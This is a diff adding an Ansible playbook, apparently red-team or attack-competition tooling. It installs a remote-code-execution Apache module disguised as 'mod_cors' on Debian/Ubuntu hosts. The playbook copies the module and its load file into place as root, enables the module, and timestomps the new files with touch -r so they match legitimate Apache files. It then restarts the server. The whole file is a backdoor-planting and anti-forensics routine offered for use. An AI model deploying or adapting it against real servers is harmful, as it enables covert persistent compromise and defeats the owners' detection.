@@ -1,0 +1,29 @@
+- name: Install an RCE apache mod to apache2 style installations (Debian/Ubuntu)
+  hosts: U18
+  tasks:
+  - name: Push the mod
+    ansible.builtin.copy:
+      src: /opt/payloads/u18/mod_cors.so
+      dest: /usr/lib/apache2/modules/mod_cors.so
+      owner: root
+      group: root
+      mode: '644'
+  - name: Push the config file
+    ansible.builtin.copy:
+      src: /opt/payloads/u18/mod_cors.load
+      dest: /etc/apache2/mods-available/cors.load
+      owner: root
+      group: root
+      mode: '644'
+  - name: Enable the mod, set the dates to blend in, and restart apache
+    ansible.legacy.shell: |
+      cd /etc/apache2/mods-enabled
+      ln -s ../mods-available/cors.load cors.load
+      touch -r /usr/lib/apache2/modules/mod_cache.so /usr/lib/apache2/modules/mod_cors.so
+      touch -r /etc/apache2/mods-available/http2.load /etc/apache2/mods-available/cors.load
+      touch -hr /etc/apache2/mods-enabled/mime.load /etc/apache2/mods-enabled/cors.load
+      touch -r /etc/apache2/sites-available /etc/apache2/mods-available
+      touch -r /etc/apache2/sites-enabled /etc/apache2/mods-enabled
+      systemctl restart apache2
+    args:
+      executable: /bin/bash
